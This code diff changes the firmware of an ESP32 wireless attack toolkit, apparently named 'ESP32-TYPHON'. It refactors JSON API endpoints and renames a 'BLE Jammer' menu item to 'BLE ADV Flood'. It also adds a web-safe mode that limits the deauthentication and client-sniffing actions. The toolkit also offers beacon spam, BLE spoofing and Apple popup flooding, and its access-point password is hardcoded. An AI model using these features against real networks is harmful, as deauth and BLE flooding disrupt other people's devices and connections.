-         ",\"ch\":" + String(wifiNets[i].ch) + ",\"bssid\":\"" + String(bssid) +
-         "\",\"enc\":\"" + String(encStr) + "\",\"open\":" +
-         ((wifiNets[i].enc == WIFI_AUTH_OPEN) ? "true" : "false") + "}";
+    j += "{\"ssid\":\"" + s + "\",\"bssid\":\"" + String(bssid) +
+         "\",\"rssi\":" + String(wifiNets[i].rssi) +
+         ",\"ch\":" + String(wifiNets[i].ch) +
+         ",\"enc\":\"" + String(encStr) +
+         "\",\"open\":" + String(wifiNets[i].enc == WIFI_AUTH_OPEN ? "true" : "false") + "}";
   }
-  j += "],\"ble\":[";
+  j += "]}";
+  return j;
+}
+
+static String jsonBleList() {
+  String j = "{\"ble\":[";
   for (int i = 0; i < bleCount; i++) {
     if (i) j += ",";
     String n = bleDevs[i].name; n.replace("\"", "'");
@@ -3066,7 +3328,18 @@ static String jsonStatus() {
          ",\"sus\":" + String(bleDevs[i].suspicious ? "true" : "false") +
          ",\"rand\":" + String(bleDevs[i].randomized ? "true" : "false") + "}";
   }
-  j += "],\"clients\":[";
+  j += "],\"apple\":[";
+  for (int i = 0; i < APPLE_LIST_COUNT; i++) {
+    if (i) j += ",";
+    String n = appleList[i].name; n.replace("\"", "'");
+    j += "\"" + n + "\"";
+  }
+  j += "]}";
+  return j;
+}
+
+static String jsonClientsList() {
+  String j = "{\"clients\":[";
   for (int i = 0; i < clientCount; i++) {
     if (i) j += ",";
     char macs[18];
@@ -3075,7 +3348,12 @@ static String jsonStatus() {
              clients[i].mac[3], clients[i].mac[4], clients[i].mac[5]);
     j += "{\"mac\":\"" + String(macs) + "\",\"rssi\":" + String((int)clients[i].rssi) + "}";
   }
-  j += "],\"airtags\":[";
+  j += "]}";
+  return j;
+}
+
+static String jsonAirList() {
+  String j = "{\"airtags\":[";
   for (int i = 0; i < airTagCount; i++) {
     if (i) j += ",";
     String nm = airTags[i].name; nm.replace("\"", "'");
@@ -3116,6 +3394,22 @@ static void handleWebRoot() { webServer.send_P(200, "text/html", WEB_PAGE); }
 static void handleWebStatus() {
   if (!webApiAuthorized()) { webSendUnauthorized(); return; }
   webServer.send(200, "application/json", jsonStatus());
+}
+static void handleWebWifi() {
+  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
+  webServer.send(200, "application/json", jsonWifiList());
+}
+static void handleWebBle() {
+  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
+  webServer.send(200, "application/json", jsonBleList());
+}
+static void handleWebClientsList() {
+  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
+  webServer.send(200, "application/json", jsonClientsList());
+}
+static void handleWebAir() {
+  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
+  webServer.send(200, "application/json", jsonAirList());
 }
 
 static void handleWebApi() {
@@ -3159,7 +3453,7 @@ static void handleWebApi() {
     if (webMode) {
       WiFi.mode(WIFI_AP_STA);
       WiFi.softAP("ESP32-TYPHON", "rgisking");
-      delay(40);
+  radioSettleRequest(25);
     }
     wifiScanStart();
     msg = wifiScanning ? "Wi-Fi scan started" : "Scan failed to start";
@@ -3196,7 +3490,7 @@ static void handleWebApi() {
       if (customBeaconCount == 0) {
         msg = "Add at least one SSID";
         webServer.send(200, "application/json",
-          String("{\"msg\":\"") + msg + "\",\"status\":" + jsonStatus() + "}");
+          String("{\"msg\":\"") + msg + "\"}");
         return;
       }
     }
@@ -3207,6 +3501,7 @@ static void handleWebApi() {
   else if (action == "client_sniff_start") {
     stopAllTools();
     if (target < 0 || target >= wifiCount) msg = "Select AP first";
+    else if (webSafeActive()) msg = "Web-safe: client sniff disabled (use handheld)";
     else { clientSniffStart(target); msg = String("Sniffing clients on ") + wifiNets[target].ssid; }
   }
   else if (action == "client_sniff_stop") { clientSniffStop(); msg = "Client sniff stopped"; }
@@ -3214,7 +3509,9 @@ static void handleWebApi() {
     stopAllTools();
     if (target < 0) deauthStartAll();
     else deauthStart(target);
-    msg = "Deauth started";
+    msg = webSafeActive()
+      ? "Deauth on CH1 only (web-safe; off-channel APs unaffected)"
+      : "Deauth started";
   }
   else if (action == "deauth_stop") { deauthStop(); msg = "Deauth stopped"; }
   else if (action == "det_start") { stopAllTools(); detStart(); msg = "Detector started"; }
@@ -3288,7 +3585,7 @@ static void handleWebApi() {
   else msg = "Unknown action";
 
   webServer.send(200, "application/json",
-    String("{\"msg\":\"") + msg + "\",\"status\":" + jsonStatus() + "}");
+    String("{\"msg\":\"") + msg + "\"}");
 }
 
 
@@ -3306,6 +3603,10 @@ static void setupWebRoutes() {
   webServer.stop();
   webServer.on("/", HTTP_GET, handleWebRoot);
   webServer.on("/api/status", HTTP_GET, handleWebStatus);
+  webServer.on("/api/wifi", HTTP_GET, handleWebWifi);
+  webServer.on("/api/ble", HTTP_GET, handleWebBle);
+  webServer.on("/api/clients", HTTP_GET, handleWebClientsList);
+  webServer.on("/api/air", HTTP_GET, handleWebAir);
   webServer.on("/api", HTTP_POST, handleWebApi);
   webServer.onNotFound(handleWebRoot);
   webServer.begin();
@@ -3319,7 +3620,7 @@ static void enterWebMode() {
   digitalWrite(STATUS_LED, HIGH);
   WiFi.mode(WIFI_AP);
   WiFi.softAP("ESP32-TYPHON", "rgisking");
-  delay(150);
+  radioSettleRequest(25);
   setupWebRoutes();
   drawWebModeScreen();
   Serial.println("[WEB] Soft-AP ESP32-TYPHON / rgisking -> http://192.168.4.1");
@@ -3365,7 +3666,7 @@ const int UI::WIFI_COUNT = 9;
 
 const char* const UI::BLE_ITEMS[] = {
   "BLE Scanner", "BLE Sniffer", "BLE Spoofer", "Sour Apple",
-  "BLE Jammer", "AirTag Tools", "Back"
+  "BLE ADV Flood", "AirTag Tools", "Back"
 };
 const int UI::BLE_COUNT = 7;
 
@@ -3490,7 +3791,7 @@ void UI::handleInput(JoyAction a) {
       _screen == SCR_DEAUTH_DET || _screen == SCR_CAPTIVE) {
     if (a == JOY_BACK) goBack();
     else if (a == JOY_SELECT) {
-      if (_screen == SCR_PACKET_MON) { pmStop(); delay(20); pmStart(); _dirty = true; }
+      if (_screen == SCR_PACKET_MON) { pmStop(); pmStart(); _dirty = true; }
       else if (_screen == SCR_BEACON) {
         if (beaconRunning) beaconStop();
         else if (beaconMode == 1 && wifiCount == 0) { /* need scan */ }
@@ -3556,7 +3857,7 @@ void UI::handleInput(JoyAction a) {
     if (a == JOY_BACK) goBack();
     else if (a == JOY_SELECT) {
       if (_screen == SCR_BLE_SNIFF) {
-        sniffStop(); delay(20); sniffStart(); _dirty = true;
+        sniffStop(); sniffStart(); _dirty = true;
       } else if (_screen == SCR_BLE_SPOOF) {
         if (spoofRunning) spoofStop();
         else if (spoofMode == 4 && bleCount == 0) { /* need BLE scan */ }
@@ -3590,7 +3891,7 @@ void UI::handleInput(JoyAction a) {
     return;
   }
 
-  // BLE Jammer
+  // BLE ADV Flood
   if (_screen == SCR_BLE_JAM) {
     if (a == JOY_BACK) goBack();
     else if (a == JOY_SELECT) {
@@ -3945,7 +4246,7 @@ static void drawSourAppleList(int sel, int top) {
 }
 
 static void drawJamScreen() {
-  Theme::drawStatusBar("BLE Jammer");
+  Theme::drawStatusBar("BLE ADV Flood");
   if (jamRunning) {
     Theme::printCentered("FLOODING", 40, COL_ERR, 1);
     char buf[24];
